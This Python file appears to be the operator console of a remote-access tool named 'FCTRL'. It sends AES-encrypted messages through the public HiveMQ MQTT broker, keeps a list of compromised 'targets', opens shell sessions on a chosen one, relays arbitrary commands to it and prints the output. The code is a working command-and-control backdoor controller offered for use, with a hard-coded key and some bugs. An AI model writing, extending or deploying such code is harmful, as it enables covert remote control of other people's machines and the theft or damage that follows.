import paho.mqtt.client as mqtt
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import uuid
import json
import os
import sys
import threading
import time
from pick import pick

current_target = ""
current_session = ""
vaild_targets = {}
await_confirm = []

key = b"fe333581d9f246ee" # get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC)
iv = cipher.iv

def encrypt_message(message, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_message = cipher.encrypt(pad(message.encode("utf-8"), AES.block_size))
    return base64.b64encode(iv + encrypted_message).decode("utf-8")

def decrypt_message(encrypted_message, key):
    try:
        encrypted_message = base64.b64decode(encrypted_message)
        iv = encrypted_message[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_message = unpad(cipher.decrypt(encrypted_message[AES.block_size:]), AES.block_size)
        return decrypted_message.decode("utf-8")
    except (ValueError, KeyError):
        return None

broker = "broker.hivemq.com"
port = 1883
topic = "FCTRL/secure"
connected = False

def on_connect(client, userdata, flags, rc):
    global connected
    print(f"[+] Connected with result code {rc}")
    client.subscribe(topic)
    connected = True

def on_message(client, userdata, msg):
    global current_target, current_session, await_confirm

    decrypted_message = decrypt_message(msg.payload.decode("utf-8"), key)
    if decrypted_message is not None:
        try:
            json_message = json.loads(decrypted_message)
            if json_message.get("type") == "status":
                vaild_targets[json_message.get("client")] = 10
            if json_message.get("type") == "confirm_session":
                if json_message.get("message_id") in await_confirm:
                    await_confirm.remove(json_message.get("message_id"))
                    current_session = json_message.get("session_id")
                    publish_json_message(client, topic, {
                        "type": "start_session",
                        "target": target,
                        "session_id": current_session
                    })
                    print("[+] Generating shell")
            if json_message.get("type") == "cmdoutput":
                if json_message.get("session_id") == current_session:
                    print(json_message.get("output"), end="")
                    sys.stdout.flush()
            if json_message.get("type") == "end_session":
                if json_message.get("type") == current_session:
                    current_target = ""
                    current_session = ""
                    print(f"\n\n[-] Session ended\ncontinue>", end="")
        except json.JSONDecodeError:
            print("[-] Failed to decode JSON from the message")
    else:
        print("[-] Failed to decrypt the message")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

def publish_json_message(client, topic, message:json):
    json_message = json.dumps(message)
    iv = get_random_bytes(16)
    encrypted_message = encrypt_message(json_message, key, iv)
    client.publish(topic, encrypted_message)

print("[+] Connecting to broker")

while True:
    try:
        client.connect(broker, port, 60)
        break
    except Exception as e:
        print(f"[-] Connection error: {e}. Retrying in 5 seconds...")
        time.sleep(5)

client.loop_start()

def verify_status():
    global current_target, current_session
    while True:
        for target in list(vaild_targets):
            vaild_targets[target] -= 1
            if vaild_targets[target] < 0:
                vaild_targets.pop(target, None)
                current_target = ""
                current_session = ""
                print(f"\n\n[-] Target lost\ncontinue>", end="")
                
        time.sleep(0.5)

threading.Thread(target=verify_status, daemon=True).start()

while not connected:
    pass

try:
    while True:
        if current_target and current_target in vaild_targets:
            sys.stdout.write("")
            sys.stdout.flush()

            cmd = input()
            publish_json_message(client, topic, {
                "type": "cmd_input",
                "target": target,
                "session_id": current_session,
                "input": cmd
            })
            if cmd.strip().lower() == "exit":
                current_session = ""
                current_target = ""
                os.system("cls" if os.name == "nt" else "clear")
        else:
            os.system("cls" if os.name == "nt" else "clear")
            picks = list(vaild_targets)
            title = f"FCTRL tool\n{len(picks)} valid target"
            picks.insert(0, "update")
            picks.insert(1, "config")
            picks.insert(2, "exit")
            option, index = pick(picks, title=title, indicator=">")

            if option == "update":
                pass
            elif option == "config":
                picks = ["upper", "set AES key"]
                title = f"FCTRL tool\nconfig"
                option, index = pick(picks, title=title, indicator=">")

                if option == "set AES key":
                    os.system("cls" if os.name == "nt" else "clear")
                    new_key = input("Enter new AES key (16)>")
                    if new_key:
                        key = (new_key*(int(16/len(new_key))+1))[:16]
            elif option == "exit":
                exit()
            else:
                target = option
                message_id = uuid.uuid4().hex
                await_confirm.append(message_id)
                publish_json_message(client, topic, {
                    "type": "new_session",
                    "target": target,
                    "message_id": message_id
                })
                os.system("cls" if os.name == "nt" else "clear")
                print("[+] Connecting to target")

                for t in range(10):
                    time.sleep(0.5)
                    if current_session:
                        break
                if current_session:
                    current_target = target
                    os.system("cls" if os.name == "nt" else "clear")
                    print("[+] Target connected successfully")
                else:
                    print("[-] Connection failed")
                    input("continue>")
            print()
except KeyboardInterrupt:
    print("[-] Disconnecting from broker")
    client.loop_stop()
    client.disconnect()
